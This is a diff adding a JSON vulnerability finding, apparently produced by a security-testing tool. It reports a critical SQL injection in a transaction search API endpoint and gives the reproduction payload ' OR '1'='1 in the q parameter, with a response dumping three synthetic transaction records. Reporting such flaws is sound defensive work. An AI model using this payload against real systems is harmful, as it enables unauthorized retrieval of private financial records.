@@ -1,0 +1,22 @@
+{
+  "id": "VULN-002",
+  "type": "SQLI",
+  "endpoint": "/api/transactions/search",
+  "http_method": "GET",
+  "severity": "critical",
+  "description": "Unsanitized input in search endpoint allows SQL injection and unauthorized record retrieval.",
+  "reproduction": {
+    "headers": {},
+    "payload": {},
+    "url_params": {
+      "q": "' OR '1'='1"
+    },
+    "test_user": "anonymous"
+  },
+  "evidence": {
+    "status_code": 200,
+    "response_body": "{\"results\": [{\"id\": 1, \"user_id\": 101, \"amount\": 500.0, \"description\": \"Salary deposit\"}, {\"id\": 2, \"user_id\": 102, \"amount\": 1200.0, \"description\": \"Secret Offshore Transfer\"}, {\"id\": 3, \"user_id\": 101, \"amount\": 45.0, \"description\": \"Grocery store\"}]}",
+    "extracted_data": "Dumped 3 transaction records."
+  },
+  "timestamp": "2026-09-26T20:14:31.531406Z"
+}
